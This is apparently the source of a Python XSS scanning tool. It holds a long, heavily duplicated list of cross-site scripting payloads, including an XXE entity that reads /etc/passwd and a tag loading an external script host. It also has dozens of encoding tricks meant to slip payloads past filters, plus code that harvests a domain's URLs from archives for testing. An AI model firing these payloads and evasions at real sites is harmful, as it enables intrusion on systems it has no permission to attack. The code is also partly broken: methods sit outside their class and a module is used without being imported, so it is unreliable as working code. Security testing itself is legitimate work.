import base64
import threading
import pandas as pd
import os
from datetime import datetime
from colorama import Fore, Style
import sys
import argparse
import requests
import re
from urllib.parse import urlparse, parse_qs, urlunparse
import numpy as np
import sqlite3
import random
import signal
import time
from functools import partial
from concurrent.futures import ThreadPoolExecutor
from jinja2 import Environment, FileSystemLoader
import html
import warnings

# Suppress the specific SyntaxWarning
warnings.filterwarnings("ignore", category=SyntaxWarning)

cursor = "|"

def animate_cursor():
    global cursor
    while True:
        cursor = "|"
        time.sleep(0.5)
        cursor = " "
        time.sleep(0.5)

cursor_thread = threading.Thread(target=animate_cursor)
cursor_thread.daemon = True
cursor_thread.start()
print(f"Loading{cursor}", end='\r')

current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
requests.packages.urllib3.disable_warnings()

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

# Capture start time
start_time = time.time()

# Define folder paths for outputs
OUTPUT_FOLDER = "reports"
HTML_FOLDER = os.path.join(OUTPUT_FOLDER)
TEXT_FOLDER = os.path.join(OUTPUT_FOLDER)

# Ensure the folders exist
os.makedirs(HTML_FOLDER, exist_ok=True)
os.makedirs(TEXT_FOLDER, exist_ok=True)

from colorama import Fore, Style

def score_endpoint(url, response, payloads):
    score = 0

    if response.status_code == 200:
        score += 3
        print(f"{Fore.GREEN}[200 OK]{Style.RESET_ALL} Status code indicates success. Score: +3")
    elif response.status_code in [403, 302]:
        score += 2
        print(f"{Fore.YELLOW}[Redirect or Forbidden]{Style.RESET_ALL} Status code {response.status_code} detected. Score: +2")

    if any(payload in response.text for payload in payloads):
        score += 5
        print(f"{Fore.MAGENTA}[Payload Match]{Style.RESET_ALL} XSS payload detected in response. Score: +5")

    if '?' in url and '=' in url:
        score += 2
        print(f"{Fore.CYAN}[Query Parameters Found]{Style.RESET_ALL} URL contains query parameters. Score: +2")

    if 'error' in response.text or 'not found' in response.text:
        score -= 3
        print(f"{Fore.RED}[Error/Not Found]{Style.RESET_ALL} 'Error' or 'Not Found' detected in response. Score: -3")

    return score


def display_output(urls):
    """
    Nicely formatted CLI output for URLs.

    Args:
        urls (list): List of processed URLs.
    """
    print("\nProcessed URLs:\n" + "=" * 40)
    if urls:
        for i, url in enumerate(urls, 1):
            print(f"[{i}] {url}")
    else:
        print("No usable URLs found.")
    print("=" * 40)

def print_colored_result(url, score, elapsed_time=None):
    if score >= 5:
        print(f"{Fore.GREEN}[Likely Valid]{Style.RESET_ALL} {url} "
              f"(Score: {score}, Time: {elapsed_time:.2f}s)" if elapsed_time else f"{Fore.GREEN}[Likely Valid]{Style.RESET_ALL} {url}")
    elif score >= 2:
        print(f"{Fore.YELLOW}[Medium Likelihood]{Style.RESET_ALL} {url} "
              f"(Score: {score}, Time: {elapsed_time:.2f}s)" if elapsed_time else f"{Fore.YELLOW}[Medium Likelihood]{Style.RESET_ALL} {url}")
    else:
        print(f"{Fore.RED}[Unlikely Valid]{Style.RESET_ALL} {url} "
              f"(Score: {score}, Time: {elapsed_time:.2f}s)" if elapsed_time else f"{Fore.RED}[Unlikely Valid]{Style.RESET_ALL} {url}")
  

xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')" />',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    '"><img src="x" onerror="alert(\'XSS\')" />',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')" />',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    '<img src=x onerror=alert("XSS")>',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    # XSS Locator (Polygot)
    '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
    # Malformed A Tags
    '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
    '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
    # Malformed IMG Tags
    '<img foo=a src="javascript:alert(\'XSS\')">',
    '<img foo=a onerror="alert(\'XSS\')">',
    # fromCharCode
    '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
    # Default SRC Tag to Get Past Filters that Check SRC Domain
    '<img src="http://example.com/image.jpg">',
    # Default SRC Tag by Leaving it Empty
    '<img src="">',
    # Default SRC Tag by Leaving it out Entirely
    '<img>',
    # On Error Alert
    '<img src=x onerror=alert("XSS")>',
    # IMG onerror and JavaScript Alert Encode
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    # Decimal HTML Character References
    '&#34;><img src=x onerror=alert(\'XSS\')>',
    # Decimal HTML Character References Without Trailing Semicolons
    '&#34><img src=x onerror=alert(\'XSS\')>',
    # Hexadecimal HTML Character References Without Trailing Semicolons
    '&#x22><img src=x onerror=alert(\'XSS\')>',
    # List-style-image
    '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
    # VBscript in an Image
    '<img src="vbscript:alert(\'XSS\')">',
    # SVG Object Tag
    '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
    # ECMAScript 6
    '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
    # BODY Tag
    '<BODY ONLOAD=alert(\'XSS\')>',
    # <BODY ONLOAD=alert('XSS')>
    '<BODY ONLOAD=alert(\'XSS\')>',
    # Event Handlers
    '<img onmouseover="alert(\'XSS\')" src="x">',
    # Various Tags with Broken-up for XSS
    '<s<Sc<script>ript>alert(\'XSS\')</script>',
    # TABLE
    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
    # TD
    '<TD BACKGROUND="javascript:alert(\'XSS\')">',
    # DIV
    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
    # BASE TAG
    '<BASE HREF="javascript:alert(\'XSS\');//">',
    # OBJECT TAG
    '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
    # SSI XSS
    '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
    # HTML+TIME IN XML
    '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
    # Using ActionScript Inside Flash
    '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
    # MIME
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
]

obfuscation_methods = [

        lambda payload: payload,  # No obfuscation

        # 1. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
        lambda payload: "".join(f"\\x{ord(char):02x}" for char in payload) if payload else payload,

        # 2. Obfuscate with Unicode escape sequences (e.g., \uHHHH)
        lambda payload: "".join(f"\\u{ord(char):04x}" for char in payload) if payload else payload,

        # 3. Base64 encode the payload
        lambda payload: base64.b64encode(payload.encode()).decode(errors='ignore') if payload is not None else None,

        # 4. Encode the payload in UTF-16
        lambda payload: payload.encode('utf-16').decode(errors='ignore') if payload is not None else None,

        # 5. Encode the payload with ROT13
        lambda payload: payload.encode('rot_13').decode(errors='ignore') if payload is not None else None,

        # 6. Obfuscate with percent-encoded characters (e.g., %HH)
        lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,

        # 7. Obfuscate with HTML entity references (e.g., &#xHH;)
        lambda payload: "".join(f"&#x{ord(char):X};" for char in payload) if payload else payload,

        # 8. Replace 'a' with null character '\x00a' and 'l' with '\x00c' (if a string)
        lambda payload: payload.replace('a', '\x00a').replace('l', '\x00c') if payload is not None and isinstance(payload, str) else payload,

        # 9. Encode the payload in UTF-16LE
        lambda payload: payload.encode('utf-16le').decode(errors='ignore') if payload is not None else None,

        # 10. Encode the payload in UTF-32LE
        lambda payload: payload.encode('utf-32le').decode(errors='ignore') if payload is not None else None,

        # 11. Reverse the payload
        lambda payload: payload[::-1] if payload is not None else payload,

        # 12. Convert payload to uppercase
        lambda payload: payload.upper() if payload is not None else payload,

        # 13. Convert payload to lowercase
        lambda payload: payload.lower() if payload is not None else payload,

        # 14. Swap case of the payload characters
        lambda payload: payload.swapcase() if payload is not None else payload,

        # 15. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
        lambda payload: "".join(f"%{ord(char):02x}" for char in payload) if payload else payload,

        # 16. Obfuscate with Unicode escape sequences (e.g., \uHHHH)
        lambda payload: "".join(f"\\u{ord(char):04x}" for char in payload) if payload else payload,

        # 17. Encode the payload in UTF-32BE
        lambda payload: payload.encode('utf-32be').decode(errors='ignore') if payload is not None else None,

        # 18. Obfuscate with Unicode escape sequences (e.g., \uHHHH)
        lambda payload: "".join(f"%U{ord(char):08X}" for char in payload) if payload else payload,

        # 19. Obfuscate with hexadecimal escape sequences (e.g., \xHHHHHHHH)
        lambda payload: "".join(f"%x{ord(char):08X}" for char in payload) if payload else payload,

        # 20. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
        lambda payload: "".join(f"\\x{ord(char):02X}" for char in payload) if payload else payload,

        # 21. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
        lambda payload: "".join(f"\\x{ord(char):02X} " for char in payload) if payload else payload,

        # 22. Obfuscate with Unicode escape sequences (e.g., \uHHHH)
        lambda payload: "".join(f"\\u{ord(char):04X} " for char in payload) if payload else payload,

        # 23. Join words with plus symbols
        lambda payload: "+".join(payload.split()) if payload else payload,

        # 24. Remove null characters (if a string)
        lambda payload: payload.replace('\x00', '') if payload is not None and isinstance(payload, str) else payload,

        # 25. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
        lambda payload: "".join(f"\\x{ord(char):02x}" for char in payload) if payload else payload,

        # 26. Replace '<' with '&lt;' and '>' with '&gt;'
        lambda payload: payload.replace('<', '&lt;').replace('>', '&gt;') if payload else payload,

        # 27. Replace double quotes and single quotes with HTML entity references
        lambda payload: payload.replace('"', '&quot;').replace('\'', '&#39;') if payload else payload,

        # 28. Obfuscate with backslashes (e.g., \char)
        lambda payload: "".join(f"\\{char}" for char in payload) if payload else payload,

        # 29. Obfuscate with double backslashes (e.g., \\char)
        lambda payload: "".join(f"\\{char}" for char in payload) if payload else payload,

        # 30. Obfuscate with percent-encoded characters (e.g., %uHHHH)
        lambda payload: "".join(f"%u{ord(char):04X}" for char in payload) if payload else payload,

        # 31. Obfuscate with percent-encoded characters (e.g., %HH)
        lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,

        # 32. Obfuscate with Unicode escape sequences (e.g., \UHHHHHHHH)
        lambda payload: "".join(f"%U{ord(char):08X}" for char in payload) if payload else payload,

        # 33. Obfuscate with percent-encoded characters (e.g., %HH; )
        lambda payload: "".join(f"%{ord(char):02X}; " for char in payload) if payload else payload,

        # 34. Obfuscate with percent-encoded characters (e.g., %uHHHH; )
        lambda payload: "".join(f"%u{ord(char):04X}; " for char in payload) if payload else payload,

        # 35. Obfuscate with percent-encoded characters (e.g., %HH )
        lambda payload: "".join(f"%{ord(char):X} " for char in payload) if payload else payload,

        # 36. Obfuscate with HTML entity references (e.g., &#xHH;)
        lambda payload: "".join(f"&#x{ord(char):X} " for char in payload) if payload else payload,

        # 37. Replace '1' with 'I' and '0' with 'O' (if a string)
        lambda payload: payload.replace('1', 'I').replace('0', 'O') if payload else payload,

        # 38. Obfuscate with percent-encoded characters (e.g., %HH)
        lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,

        # 39. Obfuscate with HTML entity references (e.g., &#xHH;)
        lambda payload: "".join(f"&#x{ord(char):X};" for char in payload) if payload else payload,

        # 40. Replace 'a' with null character '\x00a' and 'l' with '\x00c' (if a string)
        lambda payload: ''.join(['\x00a' if char == 'a' else '\x00c' if char == 'l' else char for char in payload]) if payload else payload,

        # 41. Encode the payload in UTF-16LE
        lambda payload: payload.encode('utf-16le').decode(errors='ignore') if payload else payload,

        # 42. Encode the payload in UTF-32LE
        lambda payload: payload.encode('utf-32le').decode(errors='ignore') if payload else payload,

        # 43. Obfuscate with percent-encoded characters (e.g., %uHHHH; )
        lambda payload: "".join(f"%u{ord(char):04X}; " for char in payload) if payload else payload,

        # 44. Replace '<' with '&lt;' and '>' with '&gt;'
        lambda payload: payload.replace('<', '&lt;').replace('>', '&gt;') if payload else payload,

        # 45. Encode the payload in UTF-32BE
        lambda payload: payload.encode('utf-32be').decode(errors='ignore'),

        # 46. Remove null characters (if a string)
        lambda payload: payload.replace('\x00', '') if payload is not None and isinstance(payload, str) else payload,

        # 47. Obfuscate with HTML entities for special characters
        lambda payload: payload.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace('\'', '&#39;') if payload else payload,

        # 48. Obfuscate with hexadecimal escape sequences (e.g., \xHH)
        lambda payload: "".join(f"\\x{ord(char):02x}" for char in payload) if payload else payload,

        # 49. Obfuscate with octal escape sequences (e.g., \ooo)
        lambda payload: "".join(f"\\{oct(ord(char))[2:]}" for char in payload) if payload else payload,

        # 50. Obfuscate with Unicode escape sequences (e.g., \uHHHH)
        lambda payload: "".join(f"\\u{ord(char):04x}" for char in payload) if payload else payload,

        # 51. Obfuscate with HTML entity references (e.g., &#xHH;)
        lambda payload: "".join(f"&#x{ord(char):X};" for char in payload) if payload else payload,

        # 52. Obfuscate with URL encoding
        lambda payload: urllib.parse.quote(payload) if payload else payload,

        # 53. Obfuscate with base64 encoding
        lambda payload: base64.b64encode(payload.encode()).decode(errors='ignore') if payload is not None else None,

        # 54. Obfuscate with double URL encoding
        lambda payload: urllib.parse.quote(urllib.parse.quote(payload)) if payload else payload,

        # 55. Obfuscate with HTML entity references (e.g., &#HHHH;)
        lambda payload: "".join(f"&#{ord(char)};" for char in payload) if payload else payload,

        # 56. Obfuscate with HTML entity references (e.g., &amp;HHHH;)
        lambda payload: "".join(f"&amp;{ord(char)};" for char in payload) if payload else payload,

        # 57. Obfuscate with mixed character encoding (e.g., %uHH00)
        lambda payload: "".join(f"%u{ord(char):04X}00" for char in payload) if payload else payload,

        # 58. Obfuscate with URL encoding, lowercase
        lambda payload: urllib.parse.quote(payload, safe='') if payload else payload,

        # 59. Obfuscate with URL encoding, uppercase
        lambda payload: urllib.parse.quote(payload, safe='').upper() if payload else payload,

        # 60. Obfuscate with hexadecimal escape sequences, space-separated (e.g., \xHH )
        lambda payload: "".join(f"\\x{ord(char):02x} " for char in payload) if payload else payload,

        # 61. Obfuscate with Unicode escape sequences, space-separated (e.g., \uHHHH )
        lambda payload: "".join(f"\\u{ord(char):04x} " for char in payload) if payload else payload,

        # 62. Obfuscate with base64 encoding, stripping padding characters
        lambda payload: base64.b64encode(payload.encode()).decode(errors='ignore').rstrip('=') if payload is not None else None,

        # 63. Obfuscate with HTML entity references, breaking it into multiple entities
        lambda payload: "".join(f"&#{ord(char)};" for char in payload) if payload else payload,

        # 64. Obfuscate with HTML entity references, breaking it into multiple entities
        lambda payload: "".join(f"&#{ord(char)}" for char in payload) if payload else payload,

        # 65. Obfuscate with HTML entity references, mixing it with hexadecimal encoding
        lambda payload: "".join(f"&#{ord(char)};\\x{ord(char):02x}" for char in payload) if payload else payload,

        # 66. Obfuscate with base64 encoding, using an alternate encoding scheme
        lambda payload: base64.urlsafe_b64encode(payload.encode()).decode(errors='ignore') if payload is not None else None,

        # 67. Obfuscate with base64 encoding, using an alternate encoding scheme and stripping padding characters
        lambda payload: base64.urlsafe_b64encode(payload.encode()).decode(errors='ignore').rstrip('=') if payload is not None else None,

        # 68. Obfuscate with hexadecimal escape sequences, combining with spaces (e.g., \xHH\xHH)
        lambda payload: "".join(f"\\x{ord(char):02x}\\x{ord(char):02x}" for char in payload) if payload else payload,

        # 69. Obfuscate with Unicode escape sequences, combining with spaces (e.g., \uHHHH\uHHHH)
        lambda payload: "".join(f"\\u{ord(char):04x}\\u{ord(char):04x}" for char in payload) if payload else payload,

        # 70. Obfuscate with base64 encoding, using an alternate encoding scheme and adding custom padding
        lambda payload: base64.urlsafe_b64encode(payload.encode()).decode(errors='ignore').replace('=', '-').replace('+', '_') if payload is not None else None,

        # 71. Obfuscate with hexadecimal escape sequences, using curly braces (e.g., \x{HH})
        lambda payload: "".join(f"\\x{{" + f"{ord(char):02x}" + "}" for char in payload) if payload else payload,

        # 72. Obfuscate with Unicode escape sequences, using curly braces (e.g., \u{HHHH})
        lambda payload: "".join(f"\\u{{" + f"{ord(char):04x}" + "}" for char in payload) if payload else payload,

        # 73. Obfuscate with hexadecimal escape sequences, combining with curly braces (e.g., \x{HH}\x{HH})
        lambda payload: "".join(f"\\x{{" + f"{ord(char):02x}" + "}}" for char in payload) if payload else payload,

        # 74. Obfuscate with Unicode escape sequences, combining with curly braces (e.g., \u{HHHH}\u{HHHH})
        lambda payload: "".join(f"\\u{{" + f"{ord(char):04x}" + "}}" for char in payload) if payload else payload,

        # 75. Obfuscate with hexadecimal escape sequences, using parentheses (e.g., \x(HH))
        lambda payload: "".join(f"\\x(" + f"{ord(char):02x}" + ")" for char in payload) if payload else payload,

        # 76. Obfuscate with Unicode escape sequences, using parentheses (e.g., \u(HHHH))
        lambda payload: "".join(f"\\u(" + f"{ord(char):04x}" + ")" for char in payload) if payload else payload,

        # 77. Obfuscate with hexadecimal escape sequences, combining with parentheses (e.g., \x(HH)\x(HH))
        lambda payload: "".join(f"\\x(" + f"{ord(char):02x}" + ")" + f"\\x(" + f"{ord(char):02x}" + ")" for char in payload) if payload else payload,

        # 78. Obfuscate with Unicode escape sequences, combining with parentheses (e.g., \u(HHHH)\u(HHHH))
        lambda payload: "".join(f"\\u(" + f"{ord(char):04x}" + ")" + f"\\u(" + f"{ord(char):04x}" + ")" for char in payload) if payload else payload,

        # 79. Obfuscate with hexadecimal escape sequences, using square brackets (e.g., \x[HH])
        lambda payload: "".join(f"\\x[" + f"{ord(char):02x}" + "]" for char in payload) if payload else payload,

        # 80. Obfuscate with Unicode escape sequences, using square brackets (e.g., \u[HHHH])
        lambda payload: "".join(f"\\u[" + f"{ord(char):04x}" + "]" for char in payload) if payload else payload,

        # 81. Obfuscate with hexadecimal escape sequences, combining with square brackets (e.g., \x[HH]\x[HH])
        lambda payload: "".join(f"\\x[" + f"{ord(char):02x}" + "]" + f"\\x[" + f"{ord(char):02x}" + "]" for char in payload) if payload else payload,

        # 82. Obfuscate with Unicode escape sequences, combining with square brackets (e.g., \u[HHHH]\u[HHHH])
        lambda payload: "".join(f"\\u[" + f"{ord(char):04x}" + "]" + f"\\u[" + f"{ord(char):04x}" + "]" for char in payload) if payload else payload,

        # 83. Obfuscate with hexadecimal escape sequences, using angle brackets (e.g., \x<HH>)
        lambda payload: "".join(f"\\x<" + f"{ord(char):02x}" + ">" for char in payload) if payload else payload,

        # 84. Obfuscate with Unicode escape sequences, using angle brackets (e.g., \u<HHHH>)
        lambda payload: "".join(f"\\u<" + f"{ord(char):04x}" + ">" for char in payload) if payload else payload,

        # 85. Obfuscate with hexadecimal escape sequences, combining with angle brackets (e.g., \x<HH>\x<HH>)
        lambda payload: "".join(f"\\x<" + f"{ord(char):02x}" + ">" + f"\\x<" + f"{ord(char):02x}" + ">" for char in payload) if payload else payload,

        # 86. Obfuscate with Unicode escape sequences, combining with angle brackets (e.g., \u<HHHH>\u<HHHH>)
        lambda payload: "".join(f"\\u<" + f"{ord(char):04x}" + ">" + f"\\u<" + f"{ord(char):04x}" + ">" for char in payload) if payload else payload,

        # 87. Obfuscate with hexadecimal escape sequences, using square brackets and spaces (e.g., \x[HH] )
        lambda payload: "".join(f"\\x[" + f"{ord(char):02x}" + "] " for char in payload) if payload else payload,

        # 88. Obfuscate with Unicode escape sequences, using square brackets and spaces (e.g., \u[HHHH] )
        lambda payload: "".join(f"\\u[" + f"{ord(char):04x}" + "] " for char in payload) if payload else payload,

        # 89. Obfuscate with hexadecimal escape sequences, combining with square brackets and spaces (e.g., \x[HH] \x[HH] )
        lambda payload: "".join(f"\\x[" + f"{ord(char):02x}" + "] " + f"\\x[" + f"{ord(char):02x}" + "] " for char in payload) if payload else payload,

        # 90. Obfuscate with Unicode escape sequences, combining with square brackets and spaces (e.g., \u[HHHH] \u[HHHH] )
        lambda payload: "".join(f"\\u[" + f"{ord(char):04x}" + "] " + f"\\u[" + f"{ord(char):04x}" + "] " for char in payload) if payload else payload,

        # 91. Obfuscate with hexadecimal escape sequences, using angle brackets and spaces (e.g., \x<HH> )
        lambda payload: "".join(f"\\x<" + f"{ord(char):02x}" + "> " for char in payload) if payload else payload,

        # 92. Obfuscate with Unicode escape sequences, using angle brackets and spaces (e.g., \u<HHHH> )
        lambda payload: "".join(f"\\u<" + f"{ord(char):04x}" + "> " for char in payload) if payload else payload,

        # 93. Obfuscate with hexadecimal escape sequences, combining with angle brackets and spaces (e.g., \x<HH> \x<HH> )
        lambda payload: "".join(f"\\x<" + f"{ord(char):02x}" + "> " + f"\\x<" + f"{ord(char):02x}" + "> " for char in payload) if payload else payload,

        # 94. Obfuscate with Unicode escape sequences, combining with angle brackets and spaces (e.g., \u<HHHH> \u<HHHH> )
        lambda payload: "".join(f"\\u<" + f"{ord(char):04x}" + "> " + f"\\u<" + f"{ord(char):04x}" + "> " for char in payload) if payload else payload,
    ]

def make_get_request(url, response_type="json"):
    """
    Utility function to make GET requests and handle responses.
    """
    retries = 3
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    for attempt in range(retries):
        try:
            response = requests.get(url, headers=headers, timeout=3, verify=False)
            if response.ok:
                return response.json() if response_type.lower() == "json" else response.text
        except requests.RequestException as e:
            print(f"Attempt {attempt + 1} failed for {url}: {e}")
        time.sleep(2)
    print(f"Failed to fetch {url} after {retries} attempts.")
    return None


def save_extracted_urls_to_file(url_list, output_file):
    """
    Save extracted URLs to the specified .txt file.
    """
    try:
        with open(output_file, 'w') as file:
            for url in url_list:
                file.write(url + "\n")
        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}Extracted URLs saved to {output_file}")
    except OSError as e:
        print(f"Error saving extracted URLs: {e}")

def limit_links(url_list, limit):
    if limit == "all":
        return url_list
    try:
        limit = int(limit)
        return url_list[:limit]
    except ValueError:
        print(f"Invalid value for --test-links: {limit}. Using all links.")
        return url_list

def readTargetFromFile(filepath):
    urls_list = []
    with open(filepath, "r") as f:
        for urls in f.readlines():
            if urls.strip():
                urls_list.append(urls.strip())
    return urls_list


def store_vulnerabilities_in_sqlite(self):
    try:
        conn = sqlite3.connect('vulnerabilities.db')
        cursor = conn.cursor()
        # Create table if not exists
        cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            url TEXT NOT NULL,
                            payload TEXT NOT NULL,
                            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                        )''')
        # Insert vulnerabilities
        for url, payload in self.vulnerable_urls:
            cursor.execute('INSERT INTO vulnerabilities (url, payload) VALUES (?, ?)', (url, payload))
        conn.commit()
        conn.close()
        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}  Vulnerabilities stored in SQLite database. {Style.RESET_ALL} ")
    except Exception as e:
        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED} Error storing vulnerabilities in database: {Style.RESET_ALL} {e}" )


def generate_report(self):
    try:
        env = Environment(loader=FileSystemLoader('.'))
        env.globals['enumerate'] = enumerate  # Ensure Jinja2 templates have access to enumerate
        template = env.get_template('report_template.html')
        
        report_data = {
            'timestamp': current_time,
            'vulnerable_urls': self.vulnerable_urls,
            'total_links_audited': len(self.url_list),
            'total_vulnerabilities': len(self.vulnerable_urls)
        }

        report_html = template.render(report_data)
        with open(self.report_file, 'w') as report_file:
            report_file.write(report_html)
        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}HTML report generated: {self.report_file} {Style.RESET_ALL}")
    except Exception as e:
        print(f"Error generating report: {e}")


def start(self):
    # Count and display the number of discovered links
    print(f"[{current_time}] Discovered {self.links_discovered} links.")
    print(f"[{current_time}] Now implementing logics to capture XSS vulnerabilities on given links")
    self.url_list = list(set(self.url_list))
    with ThreadPoolExecutor(max_workers=int(self.threadNumber)) as executor:
        results = list(executor.map(self.scan_urls_for_xss, self.url_list))
        self.links_audited += len(self.url_list)  # Update links_audited
    self.vulnerable_urls = [url for sublist in results for url in sublist]
    if self.report_file:
        self.store_vulnerabilities_in_sqlite()
        self.generate_report()
    return self.vulnerable_urls
    
class PassiveCrawl:
    def __init__(self, domain, want_subdomain, threadNumber, deepcrawl):
        self.domain = domain
        self.want_subdomain = want_subdomain
        self.deepcrawl = deepcrawl
        self.threadNumber = threadNumber
        self.final_url_list = set()

    def make_get_request(url, response_type="json"):
        """
        Utility function to make GET requests and handle responses.
        """
        retries = 3
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }

        for attempt in range(retries):
            try:
                response = requests.get(url, headers=headers, timeout=3, verify=False)
                if response.ok:
                    return response.json() if response_type.lower() == "json" else response.text
            except requests.RequestException as e:
                print(f"Attempt {attempt + 1} failed for {url}: {e}")
            time.sleep(2)
        print(f"Failed to fetch {url} after {retries} attempts.")
        return None

    def extract_from_sources(domain, want_subdomain, sources):
        """
        Extract URLs from specified sources: AlienVault, Wayback Machine, and CommonCrawl.
        """
        final_url_list = set()
        wild_card = "*." if want_subdomain else ""

        # Iterate through the selected sources
        for source in sources:
            try:
                if source.lower() == "alienvault":
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from AlienVault...")
                    url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
                    raw_urls = make_get_request(url, "json")
                    if raw_urls and "url_list" in raw_urls:
                        for url_data in raw_urls["url_list"]:
                            final_url_list.add(url_data["url"])
                elif source.lower() == "wayback":
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from Wayback Machine...")
                    url = f"http://web.archive.org/cdx/search/cdx?url={wild_card}{domain}&output=json&collapse=urlkey&fl=original"
                    urls_list = make_get_request(url, "json")
